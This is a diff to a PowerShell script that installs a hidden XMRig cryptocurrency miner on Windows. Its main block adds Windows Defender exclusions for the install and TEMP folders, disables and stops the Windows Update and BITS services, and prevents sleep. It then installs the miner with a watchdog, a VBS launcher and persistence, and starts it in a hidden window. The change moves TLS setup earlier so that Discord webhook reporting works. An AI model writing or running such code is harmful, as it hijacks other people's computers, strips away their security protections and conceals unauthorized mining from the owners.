@@ -45,8 +45,6 @@ function Install-Miner {
     Start-Sleep -Seconds 3
     New-Item -ItemType Directory -Path $installDir -Force | Out-Null
 
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
-
     $downloaded = $false
     try {
         $wc = New-Object System.Net.WebClient
@@ -239,8 +237,12 @@ function Send-DiscordWebhook {
 
 # ==================== MAIN ====================
 try {
+    # Establish TLS connection globally first for webhooks
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
+    
     Add-MpPreference -ExclusionPath $installDir, "$env:TEMP" -ErrorAction SilentlyContinue
     try { & sc.exe config wuauserv start= disabled >$null 2>&1; & sc.exe stop wuauserv >$null 2>&1; & sc.exe config bits start= disabled >$null 2>&1; & sc.exe stop bits >$null 2>&1 } catch {}
+    
     Disable-Sleep; Enable-HugePages
     Install-Miner; Write-MinerConfig; Write-Watchdog; Write-VbsLauncher; Set-Persistence
     Start-Process $xmrigExe -ArgumentList "--config=`"$configFile`"" -WindowStyle Hidden
